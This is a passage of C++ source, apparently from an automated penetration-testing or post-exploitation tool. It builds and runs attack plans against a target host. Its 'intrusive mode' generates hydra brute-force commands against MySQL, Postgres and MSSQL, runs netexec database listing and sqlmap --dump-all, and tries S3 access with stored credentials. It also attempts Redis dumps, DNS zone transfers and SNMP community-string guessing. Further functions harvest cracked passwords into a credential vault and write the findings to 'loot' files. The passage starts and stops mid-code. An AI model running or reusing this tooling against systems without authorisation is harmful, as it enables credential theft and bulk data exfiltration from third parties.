        fs::path out = workdir / "FLOW_MEMCACHED_INFO.txt";
        std::ostringstream cmd;
        cmd << "zgrab2 banner --port " << port << " --timeout 5 --output-file '" << out.string() << "' " << host;
        add_db_flow(plan, plan_json, "FLOW_MEMCACHED_INFO", "Memcached banner (non-intrusive)", cmd.str(), out, {{"port",port}});
    }

    // Prometheus / Influx / Elastic unauthenticated endpoints (non-intrusive)
    if (trig.value("has_prometheus", false)) {
        fs::path out = workdir / "FLOW_PROMETHEUS_LIST.txt";
        std::ostringstream cmd;
        cmd << "curl -sk --max-time 6 \"http://" << host << ":9090/metrics\" -I -o '" << out.string() << "'";
        add_db_flow(plan, plan_json, "FLOW_PROMETHEUS_PING", "Prometheus metrics endpoint probe", cmd.str(), out, {{"port",9090}});
    }
    if (trig.value("has_elastic", false)) {
        fs::path out = workdir / "FLOW_ELASTIC_INDICES.txt";
        std::ostringstream cmd;
        cmd << "curl -sk --max-time 6 \"http://" << host << ":9200/_cat/indices?v\" -o '" << out.string() << "'";
        add_db_flow(plan, plan_json, "FLOW_ELASTIC_INDICES", "Elasticsearch indices list (non-intrusive)", cmd.str(), out, {{"port",9200}});
    }

    // 2) Intrusive flows: only if g_intrusive_mode == true
    if (g_intrusive_mode) {
        // Build contextual wordlists from vault (reuse existing helpers)
        nlohmann::json vault = load_creds_vault(workdir);
        auto users = build_contextual_usernames(host, vault);
        auto pwds  = build_contextual_passwords(host, /*surfaces*/ trig, workdir);

        // Write temporary spray files
        fs::path users_file = workdir / "db_users_spray.txt";
        fs::path pwds_file  = workdir / "db_pass_spray.txt";
        try {
            std::ofstream uo(users_file); for (auto &u: users) uo << u << "\n";
            std::ofstream po(pwds_file);  for (auto &p: pwds)  po << p << "\n";
        } catch (...) {}

        // DB auth bruteforce (hydra) for popular DBs
#ifndef _WIN32
        const std::string have_hydra = net_check_bin("hydra");
        if (!have_hydra.empty()) {
            // MySQL
            if (trig.value("has_mysql", false)) {
                fs::path out = workdir / "FLOW_DB_BRUTE_mysql.txt";
                std::ostringstream cmd;
                cmd << "hydra -L '" << users_file.string() << "' -P '" << pwds_file.string()
                    << "' -t 6 -w 5 -f -o '" << out.string() << "' mysql://" << host;
                add_db_flow(plan, plan_json, "FLOW_DB_BRUTE_mysql", "MySQL brute (hydra) - intrusive", cmd.str(), out, {{"service","mysql"}});
            }
            // Postgres
            if (trig.value("has_postgres", false)) {
                fs::path out = workdir / "FLOW_DB_BRUTE_postgres.txt";
                std::ostringstream cmd;
                cmd << "hydra -L '" << users_file.string() << "' -P '" << pwds_file.string()
                    << "' -t 6 -w 5 -f -o '" << out.string() << "' postgres://" << host;
                add_db_flow(plan, plan_json, "FLOW_DB_BRUTE_postgres", "Postgres brute (hydra) - intrusive", cmd.str(), out, {{"service","postgres"}});
            }
            // MSSQL
            if (trig.value("has_mssql", false)) {
                fs::path out = workdir / "FLOW_DB_BRUTE_mssql.txt";
                std::ostringstream cmd;
                cmd << "hydra -L '" << users_file.string() << "' -P '" << pwds_file.string()
                    << "' -t 6 -w 5 -f -o '" << out.string() << "' mssql://" << host;
                add_db_flow(plan, plan_json, "FLOW_DB_BRUTE_mssql", "MSSQL brute (hydra) - intrusive", cmd.str(), out, {{"service","mssql"}});
            }
        }
#endif

        // SQL dump structured: use netexec/sqlmap if available (netexec preferred for direct DB)
        const std::string have_netexec = net_check_bin("netexec");
        const std::string have_sqlmap  = net_check_bin("sqlmap");
        if (have_netexec.size()) {
            // For MySQL/Postgres: try netexec dump schema if auth found (netexec supports db modules)
            if (trig.value("has_mysql", false)) {
                fs::path out = workdir / "FLOW_DB_SQL_DUMP_mysql.txt";
                std::ostringstream cmd;
                // Example: netexec sql mysql host:port -u user -p pass --list-databases (we add placeholders:
                cmd << "netexec sql mysql " << host << " --list-databases --out '" << out.string() << "'";
                add_db_flow(plan, plan_json, "FLOW_DB_SQL_DUMP_mysql", "MySQL structured dump attempt (netexec) - intrusive", cmd.str(), out, {{"service","mysql"}});
            }
            if (trig.value("has_postgres", false)) {
                fs::path out = workdir / "FLOW_DB_SQL_DUMP_postgres.txt";
                std::ostringstream cmd;
                cmd << "netexec sql postgres " << host << " --list-databases --out '" << out.string() << "'";
                add_db_flow(plan, plan_json, "FLOW_DB_SQL_DUMP_postgres", "Postgres structured dump attempt (netexec) - intrusive", cmd.str(), out, {{"service","postgres"}});
            }
        } else if (have_sqlmap.size()) {
            // As fallback, if a SQLi URL exists, call sqlmap for structured dump
            // search plan_json or candidates for web endpoints -> plan_json["flows"] already contains candidates
            for (auto &f : plan_json["flows"]) {
                std::string desc = f.value("description", "");
                if (icontains(desc, "SQLi") || icontains(desc, "sqli") || icontains(desc, "sql injection")) {
                    fs::path out = workdir / "FLOW_SQLMAP_AUTO_DUMP.txt";
                    std::ostringstream cmd;
                    std::string u = f.value("meta", nlohmann::json::object()).value("target", "");
                    if (!u.empty()) {
                        cmd << "sqlmap -u \"" << url_encode(u) << "\" --batch --dump-all --output-dir='" << workdir.string() << "' > '" << out.string() << "' 2>&1";
                        add_db_flow(plan, plan_json, "FLOW_SQLMAP_AUTO_DUMP", "sqlmap automatic dump (intrusive)", cmd.str(), out, {{"url",u}});
                    }
                }
            }
        }

        // S3: test listing / get object with creds if found in vault (intrusive)
        if (trig.value("has_s3_like", false)) {
            fs::path out = workdir / "FLOW_S3_AUTH_TRY.txt";
            // try gentle retrieval of credentials from vault and test
            nlohmann::json vault = load_creds_vault(workdir);
            std::ostringstream cmd;
            cmd << "echo '# S3 auth tries (from vault)'; ";
            if (vault.is_array()) {
                for (auto &c : vault) {
                    std::string u = c.value("username",""), p = c.value("password","");
                    if (u.empty() || p.empty()) continue;
                    cmd << "aws s3api list-buckets --endpoint-url https://" << extract_hostname(baseurl)
                        << " --profile dummy 2>/dev/null || true; ";
                }
            }
            cmd << "true > '" << out.string() << "'";
            add_db_flow(plan, plan_json, "FLOW_S3_AUTH_TRY", "S3 auth attempts from vault (intrusive)", cmd.str(), out, {});
        }

        // Redis: write test / dump (intrusive)
        if (trig.value("has_redis", false)) {
            fs::path out = workdir / "FLOW_REDIS_DUMP.txt";
            std::ostringstream cmd;
            cmd << "python3 - <<'PY'\n"
                   "import socket,sys\n"
                   "s=socket.socket(); s.settimeout(6)\n"
                   "try:\n"
                   " s.connect(('"+host+"',6379))\n"
                   " s.send(b'INFO\\r\\n')\n"
                   " print(s.recv(65536).decode())\n"
                   "except Exception as e:\n"
                   " print('ERR',e)\n"
                   "PY\n"
                   " > '" << out.string() << "'";
            add_db_flow(plan, plan_json, "FLOW_REDIS_DUMP", "Redis dump attempt (intrusive)", cmd.str(), out, {{"port",6379}});
        }
    } // end intrusive

    return;
}

// analyse_postexploit_results_db: consolidates outputs into structured JSONs
static void analyse_postexploit_results_db(const std::string& baseurl, const fs::path& workdir) {
    using json = nlohmann::json;
    json j_auth = json::object(); j_auth["generated_at"] = current_datetime_string(); j_auth["success"] = json::array();
    json j_loot = json::object(); j_loot["generated_at"] = current_datetime_string(); j_loot["dbs"] = json::array();
    json j_s3   = json::object(); j_s3["generated_at"] = current_datetime_string(); j_s3["evidence"] = json::array();
    json j_redis= json::object(); j_redis["generated_at"] = current_datetime_string(); j_redis["evidence"] = json::array();
    json j_metrics = json::object(); j_metrics["generated_at"] = current_datetime_string(); j_metrics["evidence"] = json::array();
    json creds_frag_db = json::array();
    json creds_frag_http = json::array();

    // 1) Parse brute outputs for credentials (hydra style)
    for (auto& f : glob_files(workdir, "FLOW_DB_BRUTE_")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        static const std::regex re(R"(\b(login|username|user)\s*[:=]?\s*'([^']+)'\s*.*password\s*[:=]?\s*'([^']+)')", std::regex::icase);
        std::smatch m;
        if (std::regex_search(txt, m, re) && m.size()>=4) {
            std::string user = m[2].str();
            std::string pass = m[3].str();
            j_auth["success"].push_back({{"file", f.filename().string()}, {"user", user}, {"pass", pass}});
            // push to vault
            auto vault = load_creds_vault(workdir);
            vault_add_credential(vault, extract_hostname(baseurl), "db", "", user, pass, "hydra");
            try { save_creds_vault(workdir, vault); } catch(...) {}
            creds_frag_db.push_back({{"file", f.filename().string()}, {"username", user}, {"password", pass}});
        }
    }

    // 2) Parse DB dump attempts (netexec/sqlmap) for schema / tables / users / tokens
    for (auto& f : glob_files(workdir, "FLOW_DB_SQL_DUMP_")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        json dbmeta = json::object();
        dbmeta["file"] = f.filename().string();
        // Try to find "Database" / "Tables" / "users" strings in the dump
        if (icontains(txt, "database") || icontains(txt, "databases")) {
            dbmeta["likely_databases"] = json::array();
            std::regex rdb(R"((?mi)Database:\s*([^\r\n]+))");
            std::smatch m;
            std::string s = txt;
            auto it = std::sregex_iterator(s.begin(), s.end(), rdb);
            for (auto i = it; i != std::sregex_iterator(); ++i) {
                dbmeta["likely_databases"].push_back((*i)[1].str());
            }
        }
        if (icontains(txt, "users") || icontains(txt, "password")) {
            dbmeta["contains_possible_users"] = true;
        }
        j_loot["dbs"].push_back(dbmeta);
    }

    // 3) S3 parsing
    for (auto& f : glob_files(workdir, "FLOW_S3_")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        bool ok_list = (net_to_lower(txt).find("<ListBucketResult") != std::string::npos) ||
                       (net_to_lower(txt).find("contents") != std::string::npos) ||
                       (net_to_lower(txt).find("x-amz-request-id")!=std::string::npos);
        j_s3["evidence"].push_back({{"file", f.filename().string()}, {"listable", ok_list}});
        if (ok_list) {
            // Try to find object keys
            json objects = json::array();
            std::regex robj(R"(<Key>([^<]+)</Key>)");
            std::smatch m;
            std::string s = txt;
            auto it = std::sregex_iterator(s.begin(), s.end(), robj);
            for (auto i = it; i != std::sregex_iterator(); ++i)
                objects.push_back((*i)[1].str());
            if (!objects.empty()) j_s3["objects"] = objects;
        }
    }

    // 4) Redis: look for "connected_clients" / "role:master" / keys pattern
    for (auto& f : glob_files(workdir, "FLOW_REDIS_")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        bool has_keys = (txt.find("keys")!=std::string::npos) || (txt.find("connected_clients")!=std::string::npos);
        j_redis["evidence"].push_back({{"file", f.filename().string()}, {"has_info", has_keys}});
        if (has_keys && icontains(txt, "session") ) {
            creds_frag_db.push_back({{"file", f.filename().string()}, {"type","session_keys_fragment"}});
        }
    }

    // 5) Metrics / Elastic / Influx
    for (auto& f : glob_files(workdir, "FLOW_ELASTIC_")) {
        std::string txt = net_slurp_if_exists(f);
        j_metrics["evidence"].push_back({{"file", f.filename().string()}, {"raw_len", (int)txt.size()}});
        // try to extract indices
        std::vector<std::string> inds;
        std::istringstream iss(txt);
        std::string line;
        while (std::getline(iss, line)) {
            line = trim_copy(line);
            if (line.empty()) continue;
            // crude parse: lines often like "green open index_name ..."
            std::istringstream ls(line);
            std::string tok;
            std::vector<std::string> toks;
            while (ls >> tok) toks.push_back(tok);
            if (toks.size()>=3) {
                inds.push_back(toks[2]);
            }
        }
        if (!inds.empty()) j_metrics["elastic_indices"] = inds;
    }
    for (auto& f : glob_files(workdir, "FLOW_PROMETHEUS_")) {
        std::string txt = net_slurp_if_exists(f);
        if (!txt.empty()) j_metrics["prometheus_probe"] = f.filename().string();
    }

    // 6) Save results
    try { std::ofstream(workdir/"db_auth_success.json") << j_auth.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"db_loot_meta.json") << j_loot.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"s3_loot.json") << j_s3.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"redis_loot.json") << j_redis.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"metrics_loot.json") << j_metrics.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"creds_frag_db.json") << creds_frag_db.dump(2); } catch(...) {}
    try { std::ofstream(workdir/"creds_frag_http.json") << creds_frag_http.dump(2); } catch(...) {}

    // if we found credentials fragments, attempt to push to vault (already done on brute detection)
    // summary log
    loginfo("[AI] DB: analysis complete. Outputs: db_auth_success.json, db_loot_meta.json, s3_loot.json, redis_loot.json, metrics_loot.json");
}

// 5) Integration: call append_db_flows(...) in build plan and call analyse_postexploit_results_db(...) in consolidation
// Modify run_postexploit_web_phase: after append_net_flows(...) add:
//     append_db_flows(baseurl, workdir, plan, plan_json);
// And after analyse_postexploit_results_net(baseurl, workdir); add:
//     analyse_postexploit_results_db(baseurl, workdir);

// --------------------------------------------------------------------------------------------
// End of DB flows addition.
// --------------------------------------------------------------------------------------------

// -------------------------- Implémentation Edge / DNS / SNMP / Telemetry --------------------------
// Insert this block where append_edge_flows / analyse_postexploit_results_edge are defined.
// Requires helpers present elsewhere in the file: run_command_capture, run_command_logged,
// find_newest_file_containing, net_slurp_if_exists, net_to_lower, add_net_flow, load_creds_vault, vault_add_credential.

// Try AXFR against a specific nameserver for domain. Returns true if output non-empty.
static bool try_axfr_and_save(const std::string &ns, const std::string &domain, const fs::path &out_path) {
    try {
        fs::create_directories(out_path.parent_path());
    } catch(...) {}
    std::ostringstream cmd;
    // Use dig if available. +short would hide SOA/A records; we keep standard answer.
    cmd << "dig AXFR @" << shell_escape_double_quotes(ns) << " " << shell_escape_double_quotes(domain)
        << " +time=6 +tries=1 +noquestion +nostats";
    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 15000, false);
    std::ofstream ofs(out_path);
    ofs << "CMD: " << cmd.str() << "\n\n";
    ofs << "STDOUT:\n" << out << "\n\nSTDERR:\n" << err << "\n";
    ofs.close();
    return !out.empty() && out.find("transfer failed") == std::string::npos &&
           out.find("connection refused") == std::string::npos;
}

// Test common SNMP community strings (v1/v2c) and do a light walk of safe OIDs
static void try_snmp_communities_and_save(const std::string &target, const fs::path &out_path) {
    std::vector<std::string> communities = {"public","private","community","default","public1","public2"};
    try { fs::create_directories(out_path.parent_path()); } catch(...) {}
    std::ofstream ofs(out_path);
    ofs << "# SNMP quick check for " << target << " at " << current_datetime_string() << "\n\n";
    for (auto &comm : communities) {
        std::ostringstream cmd;
        // Try to retrieve sysDescr and ifDescr (small, safe)
        cmd << "snmpwalk -v2c -c " << shell_escape_double_quotes(comm) << " -r 1 -t 3 "
            << shell_escape_double_quotes(target) << " sysDescr.0 sysName.0 1.3.6.1.2.1.2.2.1.2 2>&1 || true";
        std::string out, err;
        bool ok = run_command_capture(cmd.str(), out, err, 10000, false);
        if (!ok) {
            ofs << "COMMUNITY: " << comm << " => failed to execute command (binary missing or network error)\n";
            ofs << "CMD: " << cmd.str() << "\nSTDERR:\n" << err << "\n\n";
            continue;
        }
        // Heuristique simple: si sortie contient non-empty lines and not "Timeout"
        std::string low = to_lower_copy(out);
        bool found = !out.empty() && low.find("timeout") == std::string::npos && low.find("no such") == std::string::npos;
        ofs << "COMMUNITY: " << comm << " => likely_ok=" << (found ? "true" : "false") << "\n";
        ofs << "OUTPUT_SNIPPET:\n";
        if (out.size() > 4096) ofs << out.substr(0, 4096) << "\n...[truncated]\n";
        else ofs << out << "\n";
        ofs << "\n----\n\n";
        // If found, add a light structured record to vault (non-sensitive - community string as credential)
        if (found) {
            try {
                auto vault = load_creds_vault(out_path.parent_path());
                // store as credential: username=snmp_community, password=<community>
                vault_add_credential(vault, target, "snmp", "", std::string("snmp_community"), comm, "snmpwalk-check");
                save_creds_vault(out_path.parent_path(), vault);
            } catch(...) {}
        }
    }
    ofs.close();
}

// Minimal telemetry sampling: scan existing logs/flows for secrets and internal addresses and write JSON
static void sample_telemetry_artifacts_and_save(const fs::path &workdir, const fs::path &out_path) {
    using json = nlohmann::json;
    json j; j["generated_at"] = current_datetime_string(); j["samples"] = json::array();
    std::vector<fs::path> candidates = {
        workdir / "recon_httpx.txt",
        workdir / "recon_zgrab2_banner.txt",
        workdir / "recon_resolved_hosts.txt",
        workdir / "recon_resolved_ips.txt",
        workdir / "recon_dig.txt",
        workdir / "recon_whatweb_verbose.log",
        workdir / "nuclei_results.txt"
    };
    std::regex secrets_re(R"((password|passwd|pwd|token|apikey|api_key|secret)[\s:=]{1,5}([^\s'\"<>{}]+))", std::regex::icase);
    std::regex ip_re(R"((?:\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|\b172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}\b|\b192\.168\.\d{1,3}\.\d{1,3}\b))");
    for (auto &f : candidates) {
        if (!fs::exists(f)) continue;
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        std::smatch m;
        std::string excerpt = txt.substr(0, 20000); // cap
        // find secrets
        auto begin = excerpt.cbegin();
        while (std::regex_search(begin, excerpt.cend(), m, secrets_re)) {
            json item;
            item["file"] = f.filename().string();
            item["type"] = "credential_snippet";
            item["snippet"] = m.str(0);
            j["samples"].push_back(item);
            begin = m.suffix().first;
        }
        // find internal IP hints
        begin = excerpt.cbegin();
        while (std::regex_search(begin, excerpt.cend(), m, ip_re)) {
            json item;
            item["file"] = f.filename().string();
            item["type"] = "internal_ip";
            item["snippet"] = m.str(0);
            j["samples"].push_back(item);
            begin = m.suffix().first;
        }
    }
    try {
        fs::create_directories(out_path.parent_path());
        std::ofstream ofs(out_path);
        ofs << std::setw(2) << j;
    } catch(...) {}
}

// -------------------- Edge triggers (DNS / SNMP / Syslog / NetFlow hints) --------------------
static nlohmann::json harvest_edge_triggers(const std::string& baseurl,
                                            const fs::path& workdir)
{
    using json = nlohmann::json;
    json j;
    j["host"] = extract_hostname(baseurl);

    // Ports ouverts (naabu déjà exécuté par agentfactory)
    fs::path naabu_all = find_newest_file_containing(workdir, "naabu");
    std::set<int> ports = parse_naabu_ports(
        naabu_all.empty() ? workdir / "recon_naabu_all.txt" : naabu_all
    );
    j["ports_open"] = std::vector<int>(ports.begin(), ports.end());

    auto has_port = [&](int p){ return ports.count(p) > 0; };

    // Bannières déjà collectées (zgrab2/httpx/whatweb)
    std::string banners = net_to_lower(
          net_slurp_if_exists(workdir/"recon_zgrab2_banner.txt")
        + "\n" + net_slurp_if_exists(workdir/"recon_httpx.txt")
        + "\n" + net_slurp_if_exists(workdir/"recon_whatweb_verbose.log")
    );

    // Heuristiques: détection best-effort sans I/O nouveau
    j["has_dns"]     = has_port(53) || (banners.find(" dns") != std::string::npos);
    j["has_snmp"]    = has_port(161) || has_port(162) || (banners.find("snmp")   != std::string::npos);
    j["has_syslog"]  = has_port(514) || has_port(6514) || (banners.find("syslog") != std::string::npos);
    j["has_netflow"] = (banners.find("netflow") != std::string::npos) ||
                       (banners.find("ipfix")   != std::string::npos) ||
                       (banners.find("sflow")   != std::string::npos);

    return j;
}

// Integrate the real (non-intrusive + intrusive if enabled) flows into append_edge_flows
static void append_edge_flows_impl(const std::string& baseurl,
                                  const fs::path& workdir,
                                  std::vector<ConfirmationCommand>& plan,
                                  nlohmann::json& plan_json)
{
    using json = nlohmann::json;
    json trig = harvest_edge_triggers(baseurl, workdir);
    plan_json["edge_triggers"] = trig;
    const std::string host = trig.value("host", extract_hostname(baseurl));
    int idx = 0;

    // Non-intrusive: collect DNS hints (from recon files) and write a FLOW that runs a local analysis task (no network)
    if (trig.value("has_dns", false)) {
        fs::path out = workdir / "FLOW_DNS_ABUSE_ANALYZE.txt";
        std::ostringstream cmd;
        cmd << "echo 'DNS abuse analysis from recon files: aggregating NS and A records (no network)'; ";
        cmd << "cat '" << (workdir/"recon_dig.txt").string() << "' 2>/dev/null || true; ";
        cmd << "cat '" << (workdir/"recon_resolved_hosts.txt").string() << "' 2>/dev/null || true; ";
        cmd << "true > '" << out.string() << "'";
        add_net_flow(plan, plan_json,
                     "FLOW_DNS_ABUSE_ANALYZE",
                     "DNS abuse (zone hints + subdomain enumeration from existing artefacts)",
                     cmd.str(), out,
                     {{"host", host}});
        ++idx;
    }

    // Non-intrusive: parse SNMP banners already collected
    if (trig.value("has_snmp", false)) {
        fs::path out = workdir / "FLOW_SNMP_ENUM_ANALYZE.txt";
        std::ostringstream cmd;
        cmd << "echo 'SNMP exposure analysis from existing banners (no snmpwalk)'; ";
        cmd << "cat '" << (workdir/"recon_zgrab2_banner.txt").string() << "' 2>/dev/null || true; ";
        cmd << "true > '" << out.string() << "'";
        add_net_flow(plan, plan_json,
                     "FLOW_SNMP_ENUM_ANALYZE",
                     "SNMP exposure analysis (from zgrab2 banners / ports 161-162)",
                     cmd.str(), out,
                     {{"host", host}});
        ++idx;
    }

    // Non-intrusive: telemetry hint analysis
    if (trig.value("has_syslog", false) || trig.value("has_netflow", false)) {
        fs::path out = workdir / "FLOW_SYSLOG_NETFLOW_ANALYZE.txt";
        std::ostringstream cmd;
        cmd << "echo 'Syslog/NetFlow telemetry exposure analysis from banners/recon files' > '" << out.string() << "'";
        add_net_flow(plan, plan_json,
                     "FLOW_SYSLOG_NETFLOW_ANALYZE",
                     "Syslog/NetFlow/IPFIX telemetry exposure analysis (non-intrusive)",
                     cmd.str(), out,
                     {{"host", host}});
        ++idx;
    }

    // Intrusive flows: only create if global flag enabled
    if (g_intrusive_mode) {
        // DNS AXFR attempts: deduce candidate domains + NS from recon_dig or recon_resolved_hosts
        fs::path digf = workdir / "recon_dig.txt";
        std::set<std::string> ns_candidates;
        std::string domain = extract_hostname(baseurl);
        if (fs::exists(digf)) {
            std::string dd = net_slurp_if_exists(digf);
            std::istringstream iss(dd);
            std::string line;
            std::regex ns_re(R"(\bNS[ \t]+([^\s;]+))", std::regex::icase);
            while (std::getline(iss, line)) {
                std::smatch m;
                if (std::regex_search(line, m, ns_re) && m.size()>=2) {
                    ns_candidates.insert(trim_copy(m[1].str()));
                }
            }
        }
        // fallback: try resolv file for NS-like lines
        fs::path resolved = workdir / "recon_resolved_hosts.txt";
        if (fs::exists(resolved)) {
            std::string rr = net_slurp_if_exists(resolved);
            std::istringstream iss(rr);
            std::string line;
            while (std::getline(iss, line)) {
                if (line.find("ns") != std::string::npos || line.find("NS") != std::string::npos) {
                    std::string t = trim_copy(line);
                    if (t.size() > 3 && t.find('.') != std::string::npos) ns_candidates.insert(t);
                }
            }
        }

        // For each candidate NS, add an intrusive AXFR placeholder that executes dig and saves output
        int axfr_idx = 0;
        for (auto &ns : ns_candidates) {
            fs::path out = workdir / ("FLOW_DNS_AXFR_" + std::to_string(axfr_idx) + ".txt");
            std::ostringstream cmd;
            cmd << "echo 'AXFR attempt (intrusive) via dig will be executed by operator tool' > '" << out.string() << "'; ";
            // Actually attempt AXFR command (we perform it here since intrusive mode is on)
            cmd << "dig AXFR @" << shell_escape_double_quotes(ns) << " " << shell_escape_double_quotes(domain)
                << " +time=6 +tries=1 +noquestion +nostats >> '" << out.string() << "' 2>&1 || true";
            add_net_flow(plan, plan_json,
                         "FLOW_DNS_AXFR_" + std::to_string(axfr_idx),
                         "DNS AXFR attempt (INTRUSIVE) against NS " + ns,
                         cmd.str(), out,
                         {{"ns", ns}, {"domain", domain}, {"warning","INTRUSIVE"}});
            ++axfr_idx;
        }
        // If no NS candidates, still add a placeholder to attempt AXFR from base host
        if (ns_candidates.empty()) {
            fs::path out = workdir / "FLOW_DNS_AXFR_fallback.txt";
            std::ostringstream cmd;
            cmd << "echo 'AXFR fallback attempt against " << shell_escape_double_quotes(domain) << "' > '" << out.string() << "'; ";
            cmd << "dig AXFR " << shell_escape_double_quotes(domain) << " +time=6 +tries=1 +noquestion +nostats >> '" << out.string() << "' 2>&1 || true";
            add_net_flow(plan, plan_json,
                         "FLOW_DNS_AXFR_FALLBACK",
                         "DNS AXFR fallback (INTRUSIVE) against domain " + domain,
                         cmd.str(), out,
                         {{"domain", domain}, {"warning","INTRUSIVE"}});
        }

        // SNMP intrusive checks: attempt communities & light walk against discovered IPs (ports_open)
        fs::path naabu_all = find_newest_file_containing(workdir, "naabu");
        std::set<int> ports = parse_naabu_ports(naabu_all.empty() ? workdir/"recon_naabu_all.txt" : naabu_all);
        // collect IP candidates from resolved file
        std::set<std::string> ip_candidates;
        if (fs::exists(workdir/"recon_resolved_ips.txt")) {
            std::string ips = net_slurp_if_exists(workdir/"recon_resolved_ips.txt");
            std::istringstream iss(ips); std::string l;
            while (std::getline(iss, l)) {
                l = trim_copy(l);
                if (l.empty()) continue;
                // simple ip extract
                std::regex ip_re(R"(((\d{1,3}\.){3}\d{1,3}))");
                std::smatch m;
                if (std::regex_search(l, m, ip_re) && m.size() >= 1) ip_candidates.insert(m[1].str());
            }
        }
        // if SNMP ports open, target them
        if (ports.count(161) || ports.count(162) || trig.value("has_snmp", false)) {
            int sidx = 0;
            if (ip_candidates.empty()) ip_candidates.insert(host); // fallback: try host
            for (auto &ip : ip_candidates) {
                fs::path out = workdir / ("FLOW_SNMP_WALK_" + std::to_string(sidx) + ".txt");
                std::ostringstream cmd;
                cmd << "echo 'SNMP community probe (intrusive) on " << shell_escape_double_quotes(ip) << "' > '" << out.string() << "'; ";
                // run snmpwalk for default communities in sequence; conservative OIDs only
                cmd << "for C in public private community; do snmpwalk -v2c -c $C -r 1 -t 3 " << shell_escape_double_quotes(ip)
                    << " sysDescr.0 sysName.0 1.3.6.1.2.1.2.2.1.2 2>/dev/null | sed -n '1,200p'; done >> '" << out.string() << "' 2>&1 || true";
                add_net_flow(plan, plan_json,
                             "FLOW_SNMP_WALK_" + std::to_string(sidx),
                             "SNMP community probe and limited walk (INTRUSIVE) against " + ip,
                             cmd.str(), out,
                             {{"ip", ip}, {"warning","INTRUSIVE"}});
                ++sidx;
            }
        }

        // Syslog/NetFlow intrusive sampling: add placeholders that only capture tiny samples
        if (trig.value("has_syslog", false) || trig.value("has_netflow", false)) {
            fs::path out = workdir / "FLOW_SYSLOG_NETFLOW_INTRUSIVE_SAMPLE.txt";
            std::ostringstream cmd;
            cmd << "echo 'Telemetry sampling (intrusive) - operator must execute safe sampling commands here' > '" << out.string() << "'; ";
            // Example: netcat/tcpdump sampling placeholders (operator must adjust)
            cmd << "echo 'PSEUDO: tcpdump -nn -c 100 -s 256 -w sample.pcap port 514 or port 2055 or port 4739' >> '" << out.string() << "' || true";
            add_net_flow(plan, plan_json,
                         "FLOW_SYSLOG_NETFLOW_INTRUSIVE_SAMPLE",
                         "Telemetry sampling (INTRUSIVE placeholder - operator action required)",
                         cmd.str(), out,
                         {{"warning","INTRUSIVE"}} );
        }
    } // end intrusive
}

// Replace previous append_edge_flows call-sites with this function (or call this from existing wrapper)
static void append_edge_flows(const std::string& baseurl,
                              const fs::path& workdir,
                              std::vector<ConfirmationCommand>& plan,
                              nlohmann::json& plan_json)
{
    append_edge_flows_impl(baseurl, workdir, plan, plan_json);
}

// Analyse des résultats Edge / DNS / SNMP / Telemetry : transforme outputs existants en fichiers loot
static void analyse_postexploit_results_edge_impl(const std::string& baseurl,
                                                  const fs::path& workdir)
{
    using json = nlohmann::json;
    const std::string host = extract_hostname(baseurl);

    // -------- 1) DNS_ZONE_LOOT : extraire des hostnames/subdomains depuis les artefacts existants --------
    std::set<std::string> all_hosts;
    auto collect_hosts_from_file = [&](const fs::path& f){
        if (!fs::exists(f)) return;
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) return;
        std::istringstream iss(txt);
        std::string token;
        while (iss >> token) {
            token = trim_copy(token);
            if (token.empty()) continue;
            if (token.find('.') == std::string::npos) continue;
            // only include those containing base host
            if (token.find(host) != std::string::npos) {
                // strip trailing punctuation
                while (!token.empty() && (token.back()==',' || token.back()==';' ||
                                          token.back()==')' || token.back()==']' ||
                                          token.back()=='.')) token.pop_back();
                if (!token.empty()) all_hosts.insert(token);
            }
        }
    };

    collect_hosts_from_file(workdir/"recon_dig.txt");
    collect_hosts_from_file(workdir/"recon_httpx.txt");
    collect_hosts_from_file(workdir/"recon_katana_urls_ok.txt");
    collect_hosts_from_file(workdir/"recon_resolved_hosts.txt");
    collect_hosts_from_file(workdir/"recon_whatweb_verbose.log");
    collect_hosts_from_file(workdir/"recon_waybackurls.txt");
    // also ingest outputs from AXFR runs (intrusive)
    for (auto &f : glob_files(workdir, "FLOW_DNS_AXFR_")) {
        collect_hosts_from_file(f);
        // try to parse zone lines like "www IN A 1.2.3.4" -> reconstruct fqdn
        std::string z = net_slurp_if_exists(f);
        std::istringstream iss(z);
        std::string line;
        while (std::getline(iss, line)) {
            // naive: if line contains host token and base host, include
            if (line.find(host) != std::string::npos) {
                std::smatch m;
                std::regex fq_re(R"(([a-zA-Z0-9._-]+\.)+[a-zA-Z]{2,})");
                if (std::regex_search(line, m, fq_re)) {
                    all_hosts.insert(m.str(0));
                }
            }
        }
    }

    try {
        std::ofstream dns_out(workdir/"dns_zone_loot.txt");
        dns_out << "# dns_zone_loot for " << host << " generated at " << current_datetime_string() << "\n";
        for (const auto& h : all_hosts) dns_out << h << "\n";
    } catch(...) {}

    // -------- 2) SNMP_LOOT : ports + snippets bannières SNMP + snmpwalk outputs --------
    json snmp;
    snmp["generated_at"] = current_datetime_string();
    snmp["host"] = host;
    snmp["ports"] = json::array();

    fs::path naabu_all = find_newest_file_containing(workdir, "naabu");
    std::set<int> ports = parse_naabu_ports(naabu_all.empty() ? workdir/"recon_naabu_all.txt" : naabu_all);
    if (ports.count(161)) snmp["ports"].push_back(161);
    if (ports.count(162)) snmp["ports"].push_back(162);

    std::string banners = net_to_lower(net_slurp_if_exists(workdir/"recon_zgrab2_banner.txt"));
    if (!banners.empty()) {
        size_t pos = banners.find("snmp");
        if (pos != std::string::npos) {
            size_t start = (pos > 200 ? pos - 200 : 0);
            size_t end   = std::min(banners.size(), pos + 200);
            snmp["banner_snippet"] = banners.substr(start, end - start);
        }
    }

    // ingest outputs from intrusive SNMP attempts
    for (auto &f : glob_files(workdir, "FLOW_SNMP_WALK_")) {
        std::string txt = net_slurp_if_exists(f);
        if (!txt.empty()) {
            json e;
            e["file"] = f.filename().string();
